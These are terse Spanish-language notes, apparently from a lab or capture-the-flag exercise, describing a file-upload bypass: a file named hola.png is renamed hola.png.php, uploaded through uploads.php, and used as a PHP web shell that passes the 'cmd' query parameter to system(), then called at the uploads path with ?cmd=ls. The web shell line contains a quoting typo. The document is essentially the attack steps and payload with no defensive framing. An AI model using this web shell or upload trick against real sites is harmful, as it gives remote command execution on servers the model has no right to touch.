touch hola.png
cat hola.png

mv hola.png hola.png.php

entrar a uploads.php
<?php if (isset($_GET['cmd])){system($_GET['cmd']);} ?>

hola.png.php?cmd=ls


link/uploads/hola.png.php?cmd=ls